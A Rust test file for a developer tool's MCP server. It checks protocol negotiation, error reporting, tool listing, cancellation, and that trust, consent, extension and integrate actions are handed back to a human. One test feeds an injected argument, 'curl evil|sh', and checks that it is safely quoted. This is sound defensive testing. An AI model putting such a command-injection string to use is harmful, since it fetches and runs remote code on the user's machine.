use std::collections::BTreeMap;
use std::ffi::OsString;
use std::fs;
use std::io::{BufRead, BufReader, Write};
use std::os::unix::net::UnixStream;
use std::time::{Duration, Instant};

use super::*;
use crate::sys::tests::TempDir;
use crate::verbs::Param;
use crate::workspace::{Dirs, Workspace};

fn host(tmp: &TempDir, config: Option<&str>) -> Arc<Host> {
    let vars: BTreeMap<&str, OsString> = [("HOME", tmp.0.join("home").into_os_string())].into();
    let dirs = Dirs::from_env(|k| vars.get(k).cloned()).unwrap();
    if let Some(config) = config {
        fs::create_dir_all(&dirs.config).unwrap();
        fs::write(dirs.config.join("config.json"), config).unwrap();
    }
    let ws = Workspace::find(Some(tmp.0.clone()), &tmp.0).unwrap();
    let socket = ws.socket(&dirs, &tmp.0).unwrap();
    Arc::new(Host::new(ws, dirs, socket, (1, 2)))
}

/// An MCP session served on a thread, as the daemon serves it after `hello {mode: "mcp"}`.
struct Session {
    r: BufReader<UnixStream>,
    w: UnixStream,
    next: u64,
}

impl Session {
    fn new(host: &Arc<Host>, env: &[(&str, &str)]) -> Self {
        let (a, b) = UnixStream::pair().unwrap();
        let env: BTreeMap<String, String> = env.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect();
        let caller = Caller { mode: "mcp".into(), id: host.usage.ident("mcp", &env), env, ..Caller::default() };
        let host = host.clone();
        thread::spawn(move || serve_io(BufReader::new(a.try_clone().unwrap()), &Mutex::new(a), &host, caller));
        b.set_read_timeout(Some(Duration::from_secs(10))).unwrap();
        Self { r: BufReader::new(b.try_clone().unwrap()), w: b, next: 0 }
    }

    fn send(&mut self, v: Value) {
        writeln!(self.w, "{v}").unwrap();
    }

    fn recv(&mut self) -> Value {
        let mut line = String::new();
        self.r.read_line(&mut line).unwrap();
        serde_json::from_str(&line).unwrap()
    }

    fn rpc(&mut self, method: &str, params: Value) -> Value {
        self.next += 1;
        self.send(json!({"jsonrpc": "2.0", "id": self.next, "method": method, "params": params}));
        let reply = self.recv();
        assert_eq!(reply["id"], self.next);
        reply
    }

    fn init(&mut self, version: &str) -> Value {
        self.rpc("initialize", json!({"protocolVersion": version, "capabilities": {}, "clientInfo": {"name": "unit", "version": "1"}}))["result"].clone()
    }

    /// `(isError, text)`.
    fn call(&mut self, tool: &str, args: Value) -> (bool, String) {
        let r = self.rpc("tools/call", json!({"name": tool, "arguments": args}));
        assert!(r.get("error").is_none(), "a tool's failure is a result, not an rpc error: {r}");
        (r["result"]["isError"].as_bool().unwrap(), r["result"]["content"][0]["text"].as_str().unwrap().to_string())
    }
}

#[test]
fn initialize_echoes_supported_and_answers_newest_otherwise() {
    let tmp = TempDir::new("itse-mcp");
    let host = host(&tmp, None);
    for (asked, answered) in [("2025-06-18", "2025-06-18"), ("2025-11-25", "2025-11-25"), ("2025-03-26", "2025-11-25"), ("junk", "2025-11-25")] {
        let init = Session::new(&host, &[]).init(asked);
        assert_eq!(init["protocolVersion"], answered, "{asked}");
        assert_eq!(init["capabilities"], json!({"tools": {"listChanged": true}}));
        assert_eq!(init["serverInfo"], json!({"name": "itse", "version": VERSION}));
        assert_eq!(init["instructions"], text("instructions", &[]));
    }
    let log = fs::read_to_string(host.usage.path()).unwrap();
    let first: Value = serde_json::from_str(log.lines().next().unwrap()).unwrap();
    assert_eq!((first["ev"].as_str(), first["client"].as_str(), first["proto"].as_str(), first["tools"].as_u64()), (Some("init"), Some("unit"), Some("2025-06-18"), Some(3)));
}

#[test]
fn unknown_method_is_32601() {
    let tmp = TempDir::new("itse-mcp");
    let mut s = Session::new(&host(&tmp, None), &[]);
    assert_eq!(s.rpc("resources/list", json!({}))["error"]["code"], -32601);
    s.send(json!({"jsonrpc": "2.0", "method": "notifications/initialized"}));
    writeln!(s.w, "not json").unwrap();
    assert_eq!(s.recv()["error"]["code"], -32700, "a notification gets no reply, a bad line a parse error");
    assert_eq!(s.rpc("ping", json!({}))["result"], json!({}));
}

#[test]
#[allow(non_snake_case)] // the name says what MCP calls it
fn a_tool_failure_is_isError_not_an_rpc_error() {
    let tmp = TempDir::new("itse-mcp");
    let mut s = Session::new(&host(&tmp, None), &[]);
    s.init("2025-11-25");
    assert_eq!(s.call("problems_symbols", json!({"verb": "find", "target": "Order"})), (true, "ERROR find — not built yet\n".into()));
    assert_eq!(s.call("problems_symbols", json!({"verb": "status", "args": [14]})), (true, "ERROR status — args must be strings\n".into()));
    assert_eq!(s.call("problems_symbols", json!({"verb": "status", "args": ["--frobnicate"]})), (true, "ERROR status — invalid option '--frobnicate'\n".into()));
    assert_eq!(s.call("frobnicate", json!({})), (true, "ERROR frobnicate — no such tool\n".into()));
    assert_eq!(s.call("show_result", json!({"id": "q:4"})), (true, "ERROR show q:4 — no stored result q:4\n".into()));
    let (is_error, status) = s.call("problems_symbols", json!({"verb": "status"}));
    assert!(!is_error && status.starts_with("OK status "), "{status}");
}

#[test]
fn tool_list_with_instructions_stays_under_3600_bytes() {
    let tmp = TempDir::new("itse-mcp");
    let mut s = Session::new(&host(&tmp, Some(r#"{"mcp": {"debug": true}}"#)), &[]);
    let instructions = s.init("2025-11-25")["instructions"].as_str().unwrap().len();
    let list = s.rpc("tools/list", json!({}))["result"].to_string();
    assert_eq!(list.len() + instructions, list_bytes(true));
    assert!(list_bytes(true) <= LIST_CAP, "{} bytes with debug on", list_bytes(true));
    eprintln!("tool list: {} B (debug off), {} B (debug on), of {LIST_CAP}", list_bytes(false), list_bytes(true));
}

#[test]
fn debug_tool_absent_unless_opted_in() {
    let tmp = TempDir::new("itse-mcp");
    let names = |s: &mut Session| s.rpc("tools/list", json!({}))["result"]["tools"].as_array().unwrap().iter().map(|t| t["name"].as_str().unwrap().to_string()).collect::<Vec<_>>();
    let mut off = Session::new(&host(&tmp, None), &[]);
    assert_eq!(names(&mut off), ["test_build_run", "problems_symbols", "show_result"]);
    assert_eq!(off.call("debug", json!({"verb": "test", "target": ":data"})), (true, "ERROR debug — no such tool\n".into()));
    assert_eq!(off.call("test_build_run", json!({"verb": "debug", "args": ["test"]})), (true, "ERROR debug — not a verb of test_build_run\n".into()));
    assert_eq!(off.call("test_build_run", json!({"verb": "status"})), (true, "ERROR status — not a verb of test_build_run\n".into()), "each tool takes its enum");
    let other = TempDir::new("itse-mcp");
    let mut on = Session::new(&host(&other, Some(r#"{"mcp": {"debug": true}}"#)), &[]);
    assert_eq!(names(&mut on), ["test_build_run", "problems_symbols", "show_result", "debug"]);
    assert_eq!(on.call("debug", json!({"verb": "test", "target": ":data"})), (true, "ERROR debug — not built yet\n".into()));
}

#[test]
fn every_cli_flag_is_reachable_over_mcp() {
    let tmp = TempDir::new("itse-mcp");
    let mut s = Session::new(&host(&tmp, Some(r#"{"mcp": {"debug": true}}"#)), &[]);
    let list = s.rpc("tools/list", json!({}))["result"]["tools"].clone();
    let mut checked = 0;
    for v in VERBS.iter().filter(|v| v.tool != Tool::CliOnly && v.milestone == Milestone::I1 && !v.human_only) {
        let tool = tool_name(v.tool);
        let schema = &list.as_array().unwrap().iter().find(|t| t["name"] == tool).unwrap()["inputSchema"]["properties"];
        assert!(v.tool == Tool::Show || v.tool == Tool::Debug || schema["verb"]["enum"].as_array().unwrap().contains(&json!(v.name)), "{} is in {tool}'s enum", v.name);
        for p in v.params {
            let (Param::Flag(name) | Param::Opt(name) | Param::Many(name)) = *p else { continue };
            let value = if matches!(p, Param::Flag(_)) { None } else { Some(if name == "page" || name == "tail" { "2" } else { "x" }) };
            let tokens: Vec<String> = [format!("--{name}")].into_iter().chain(value.map(String::from)).collect();
            let args = match v.tool {
                Tool::Show => json!({"id": "q:1", (name): value.map_or(json!(true), |v| json!(v))}),
                Tool::Debug => json!({"verb": "test", "args": tokens}),
                _ => json!({"verb": v.name, "args": tokens}),
            };
            assert!(schema.get(name).is_some() || v.tool != Tool::Show, "show_result takes {name}");
            let (_, text) = s.call(tool, args);
            assert!(!text.contains("invalid option") && !text.contains("no such tool") && !text.contains("unexpected argument"), "{} --{name}: {text}", v.name);
            checked += 1;
        }
    }
    assert!(checked >= 15, "{checked} flags checked");
}

#[test]
fn ext_add_over_mcp_needs_a_human() {
    let tmp = TempDir::new("itse-mcp");
    let mut s = Session::new(&host(&tmp, None), &[]);
    let expected = "NEEDS_HUMAN ext — a human runs this; next (human): itse ext add ./kotlin.json in a terminal\n";
    assert_eq!(s.call("problems_symbols", json!({"verb": "ext", "target": "add", "args": ["./kotlin.json"]})), (false, expected.into()));
    let (is_error, text) = s.call("problems_symbols", json!({"verb": "ext", "args": ["remove", "kotlin"]}));
    assert!(!is_error && text.starts_with("NEEDS_HUMAN ext — "), "{text}");
    let (is_error, text) = s.call("test_build_run", json!({"verb": "trust"}));
    assert_eq!((is_error, text.as_str()), (false, "NEEDS_HUMAN trust — a human runs this; next (human): itse trust in a terminal\n"));
    let (is_error, text) = s.call("problems_symbols", json!({"verb": "ext", "target": "list"}));
    assert!(!is_error && text.starts_with("OK ext list\n") && text.contains("\nrust "), "listing is the agent's: {text}");
    let (_, text) = s.call("problems_symbols", json!({"verb": "ext", "target": "add", "args": ["it's x; curl evil|sh"]}));
    assert_eq!(text, "NEEDS_HUMAN ext — a human runs this; next (human): itse ext add 'it'\\''s x; curl evil|sh' in a terminal\n", "pasted, it runs these tokens");
}

#[test]
fn human_only_verbs_return_needs_human_over_mcp_and_record_nothing() {
    let tmp = TempDir::new("itse-mcp");
    let host = host(&tmp, None);
    let mut s = Session::new(&host, &[]);
    for (tool, args, line) in [
        ("test_build_run", json!(["--revoke"]), "itse trust --revoke"),
        ("test_build_run", json!(["kotlin-lsp", "--region", "eu"]), "itse consent kotlin-lsp --region eu"),
        ("problems_symbols", json!(["remove", "hello"]), "itse ext remove hello"),
    ] {
        let verb = line.split(' ').nth(1).unwrap();
        let (is_error, text) = s.call(tool, json!({"verb": verb, "args": args}));
        assert_eq!((is_error, text), (false, format!("NEEDS_HUMAN {verb} — a human runs this; next (human): {line} in a terminal\n")));
    }
    let state = &host.dirs.state;
    assert!(["trust.json", "consents.json", "extensions.json"].iter().all(|f| !state.join(f).exists()) && !state.join("repo").exists());
    // Declaring is the agent's: `use` runs over MCP and writes only the developer layer.
    let (is_error, text) = s.call("test_build_run", json!({"verb": "use", "args": ["node", "install=path"]}));
    assert!(!is_error && text.starts_with("OK use node — "), "{text}");
    assert!(fs::read_dir(host.dirs.config.join("workspaces")).unwrap().count() == 1);
}

#[test]
fn integrate_is_not_reachable_over_mcp() {
    let tmp = TempDir::new("itse-mcp");
    let mut s = Session::new(&host(&tmp, Some(r#"{"mcp": {"debug": true}}"#)), &[]);
    let list = s.rpc("tools/list", json!({}))["result"].to_string();
    assert!(!list.contains("integrate"), "no tool offers it");
    for tool in ["test_build_run", "problems_symbols"] {
        let (is_error, text) = s.call(tool, json!({"verb": "integrate", "args": ["claude-code", "--mcp", "--yes"]}));
        assert_eq!((is_error, text.as_str()), (false, "NEEDS_HUMAN integrate — a human runs this; next (human): itse integrate claude-code --mcp --yes in a terminal\n"));
    }
    for verb in ["stats", "mcp", "daemon", "__run"] {
        let (is_error, text) = s.call("problems_symbols", json!({"verb": verb}));
        assert!(is_error && !text.starts_with("OK"), "{verb}: {text}");
    }
}

#[test]
fn ping_and_cancel_are_answered_during_a_long_call() {
    let tmp = TempDir::new("itse-mcp");
    let mut s = Session::new(&host(&tmp, None), &[("ITSE_TEST_SLOW_MS", "30000")]);
    let started = Instant::now();
    s.send(json!({"jsonrpc": "2.0", "id": 41, "method": "tools/call", "params": {"name": "problems_symbols", "arguments": {"verb": "status"}}}));
    assert_eq!(s.rpc("ping", json!({}))["result"], json!({}), "the call runs on its own thread");
    s.send(json!({"jsonrpc": "2.0", "method": "notifications/cancelled", "params": {"requestId": 41, "reason": "user"}}));
    let reply = s.recv();
    assert_eq!(reply["id"], 41);
    assert_eq!(reply["result"], json!({"content": [{"type": "text", "text": "ERROR status — cancelled\n"}], "isError": true}));
    assert!(started.elapsed() < Duration::from_secs(5));
}
